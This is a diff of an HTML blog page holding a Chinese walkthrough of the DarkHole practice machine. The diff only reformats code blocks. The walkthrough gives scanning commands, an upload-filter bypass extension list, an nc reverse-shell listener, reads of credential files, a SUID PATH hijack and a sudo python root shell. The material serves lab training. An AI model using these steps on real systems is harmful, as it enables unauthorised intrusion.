@@ -190,23 +190,23 @@ View Details 点击没反应， 进入 Login 页面">
 <p>此文章以 kali 地址为 10.10.10.5 为示例</p></blockquote>
 <h1 id="darkhole-靶场">DarkHole 靶场</h1>
 <h2 id="主机发现">主机发现</h2>
-<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
-</code></pre><p><img src="aaa.png" alt="aaa"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></div><p><img src="aaa.png" alt="aaa"></p>
 <p>靶机的主机为 10.10.10.9</p>
 <h2 id="服务识别">服务识别</h2>
 <p>使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试</p>
 <p>扫描开放的端口</p>
-<pre tabindex="0"><code>sudo nmap --min-rate 10000 -p- 10.10.10.9
-</code></pre><p><img src="bbb.png" alt="bbb"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.9
+</span></span></code></pre></div><p><img src="bbb.png" alt="bbb"></p>
 <p>扫描开放端口的基本信息，并将结果保存到本地以便于随时观看</p>
 <pre tabindex="0"><code>sudo nmap -sT -sC -sV -p22,80 10.10.10.9 -oA nmap/Scan
 </code></pre><p><img src="ccc.png" alt="ccc"></p>
 <p>使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地</p>
-<pre tabindex="0"><code>sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
-</code></pre><p><img src="ddd.png" alt="ddd"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --script<span style="color:#f92672">=</span>vuln -p22,80 10.10.10.9 -oA nmap/Script
+</span></span></code></pre></div><p><img src="ddd.png" alt="ddd"></p>
 <p>发现暴露出了很多目录，执行一下完整的目录爆破</p>
-<pre tabindex="0"><code>sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
-</code></pre><p><img src="eeee.png" alt="eeee"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
+</span></span></code></pre></div><p><img src="eeee.png" alt="eeee"></p>
 <p>除了 index.php 其他都是文件目录，
 upload 可能是文件上传的目录</p>
 <p><img src="fff.png" alt="fff"></p>
@@ -221,10 +221,10 @@ upload 可能是文件上传的目录</p>
 点击下方 Sign up now 注册一个账号试试</p>
 <p><img src="iii.png" alt="iii"></p>
 <p>如图随便输入注册一个账号试试</p>
-<pre tabindex="0"><code>admin12345
-admin12345@gmail
-admin12345
-</code></pre><p>进入后台</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin12345
+</span></span><span style="display:flex;"><span>admin12345@gmail
+</span></span><span style="display:flex;"><span>admin12345
+</span></span></code></pre></div><p>进入后台</p>
 <p><img src="jjj.png" alt="jjj"></p>
 <h3 id="越权">越权</h3>
 <p>通过尝试发现这个界面实现的是更新功能，
@@ -249,69 +249,69 @@ id=1 或 0 极有可能是 root 或 拥有 root 权限
 <p>提示只能上传 jpg , png , gif 格式的文件，
 尝试使用罕见的后缀名上传文件，
 以下是可能的 后缀名</p>
-<pre tabindex="0"><code>.php
-.php3
-.php4
-.php5
-.php7
-
-# Less known PHP extensions
-.pht
-.phps
-.phar
-.phpt
-.pgif
-.phtml
-.phtm
-.inc
-</code></pre><p>在尝试后，
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>.php
+</span></span><span style="display:flex;"><span>.php3
+</span></span><span style="display:flex;"><span>.php4
+</span></span><span style="display:flex;"><span>.php5
+</span></span><span style="display:flex;"><span>.php7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Less known PHP extensions</span>
+</span></span><span style="display:flex;"><span>.pht
+</span></span><span style="display:flex;"><span>.phps
+</span></span><span style="display:flex;"><span>.phar
+</span></span><span style="display:flex;"><span>.phpt
+</span></span><span style="display:flex;"><span>.pgif
+</span></span><span style="display:flex;"><span>.phtml
+</span></span><span style="display:flex;"><span>.phtm
+</span></span><span style="display:flex;"><span>.inc
+</span></span></code></pre></div><p>在尝试后，
 最终上传了一个 phtml 的文件是可以执行的，
 使用的是 kali 自带的 payload，
 可以在 /upload 中查看</p>
 <p><img src="ooo.png" alt="ooo"></p>
 <h2 id="linux-提权">Linux 提权</h2>
 <p>kali 建立 nc 监听</p>
-<pre tabindex="0"><code>sudo nc -lvnp 4444
-</code></pre><p>执行 payload 获得回显</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>执行 payload 获得回显</p>
 <p><img src="ppp.png" alt="ppp"></p>
 <p>使用 python3 获得更好的 shell 环境</p>
-<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
-</code></pre><p>基本枚举查看信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>基本枚举查看信息</p>
 <p><img src="qqq.png" alt="qqq"></p>
 <p>在前面目录爆破的时候看到 config 目录下有一个 php 文件，搜索出来看一下</p>
 <p><img src="rrr.png" alt="rrr"></p>
-<pre tabindex="0"><code>find / -name database.php
-</code></pre><p><img src="sss.png" alt="sss"></p>
-<pre tabindex="0"><code>cd /var/www/html/config/
-ls
-cat database.php
-</code></pre><p><img src="ttt.png" alt="ttt"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name database.php
+</span></span></code></pre></div><p><img src="sss.png" alt="sss"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/www/html/config/
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cat database.php
+</span></span></code></pre></div><p><img src="ttt.png" alt="ttt"></p>
 <p>说明了 john 和 darkhole 两个用户可能有价值</p>
 <p>查看一下 shadow 或者 passwd 的执行权限，
 shadow 没有任何权限，passwd 有读取的权限，</p>
-<pre tabindex="0"><code>ls -liah /etc/passwd
-</code></pre><p><img src="P2.png" alt="P2"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -liah /etc/passwd
+</span></span></code></pre></div><p><img src="P2.png" alt="P2"></p>
 <p>读取一下，提取出拥有 /bin/bash 的用户</p>
-<pre tabindex="0"><code>cat /etc/passwd | grep &#34;/bin/bash&#34;
-</code></pre><p><img src="P2.png" alt="P2"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd | grep <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+</span></span></code></pre></div><p><img src="P2.png" alt="P2"></p>
 <p>查看具有 s 位的可执行文件</p>
-<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
-</code></pre><p>发现 john 拥有一个具有 s 位的 可执行文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p>发现 john 拥有一个具有 s 位的 可执行文件</p>
 <p><img src="P4.png" alt="P4"></p>
 <p>运行一下看看</p>
 <p><img src="P5.png" alt="P5"></p>
 <p>尝试一下在执行 toto 之前塞一个 /bin/bash 到环境变量切换到 john 用户</p>
-<pre tabindex="0"><code>echo &#34;/bin/bash&#34; &gt; /tmp/cdt
-chmod 777 /tmp/cdt
-echo $PATH
-export PATH=/tmp:$PATH
-echo $PATH
-/home/john/toto
-</code></pre><p>成功切换</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/bin/bash&#34;</span> &gt; /tmp/cdt
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/cdt
+</span></span><span style="display:flex;"><span>echo $PATH
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span><span style="display:flex;"><span>echo $PATH
+</span></span><span style="display:flex;"><span>/home/john/toto
+</span></span></code></pre></div><p>成功切换</p>
 <p><img src="P7.png" alt="P7"></p>
 <p>进入 john 用户文件夹</p>
-<pre tabindex="0"><code>cd ../../../../../../../home/john
-</code></pre><p><img src="P8.png" alt="P8"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd ../../../../../../../home/john
+</span></span></code></pre></div><p><img src="P8.png" alt="P8"></p>
 <p>查看一下 password 文件</p>
 <p><img src="P9.png" alt="P9"></p>
 <p>john 的密码是 root123，
@@ -319,10 +319,10 @@ echo $PATH
 <p><img src="P10.png" alt="P10"></p>
 <p>发现可以免密执行 sudo 的 python3 和 file.py</p>
 <p>塞一个切换 bash 的命令 给 file.py 实现提权</p>
-<pre tabindex="0"><code>echo &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34; &gt; file.py
-cat file.py
-sudo python3 /home/john/file.py
-</code></pre><p>拿下机器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span> &gt; file.py
+</span></span><span style="display:flex;"><span>cat file.py
+</span></span><span style="display:flex;"><span>sudo python3 /home/john/file.py
+</span></span></code></pre></div><p>拿下机器</p>
 <p><img src="P11.png" alt="P11"></p>
 <h2 id="总结">总结</h2>
 <p>这台靶机的难度中等偏下，
